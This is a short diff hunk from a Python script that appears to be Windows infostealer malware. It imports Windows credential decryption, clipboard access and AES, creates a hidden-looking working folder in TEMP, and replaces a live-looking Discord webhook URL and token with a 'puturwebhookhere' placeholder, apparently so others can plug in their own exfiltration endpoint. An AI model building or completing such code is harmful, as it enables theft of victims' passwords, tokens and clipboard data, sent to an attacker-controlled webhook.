@@ -23,7 +23,7 @@ import win32crypt
 import win32clipboard
 from Crypto.Cipher import AES
 
-WEBHOOK = "https://discord.com/api/webhooks/1500015797609697392/kLPeBc9kCIo7G-HtGyV3Ddfduji1xG3GXzKlh7hTv2Nsp7IDm9jK_27jo5aVzJzt_8TL"
+WEBHOOK = "puturwebhookhere"
 TEMP = os.getenv("TEMP") or os.path.expanduser("~/AppData/Local/Temp")
 WORK_DIR = os.path.join(TEMP, f"NF_{random.randint(10000, 99999)}")
 os.makedirs(WORK_DIR, exist_ok=True)
